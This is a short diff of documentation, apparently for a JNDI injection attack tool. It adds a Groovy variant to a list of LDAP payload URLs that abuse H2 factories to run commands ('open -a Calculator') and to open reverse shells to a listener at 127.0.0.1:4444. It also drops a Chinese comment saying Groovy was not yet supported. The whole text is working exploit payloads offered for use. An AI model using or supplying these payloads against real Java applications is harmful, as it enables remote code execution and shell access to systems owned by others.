@@ -255,8 +255,9 @@ ldap://127.0.0.1:1389/Factory/H2/Java/Command/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/Groovy/Command/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/Command/open -a Calculator
 
-# 原生反弹 Shell (暂不支持 Groovy)
+# 原生反弹 Shell
 ldap://127.0.0.1:1389/Factory/H2/Java/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Factory/H2/Groovy/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/ReverseShell/127.0.0.1/4444
 ```
 
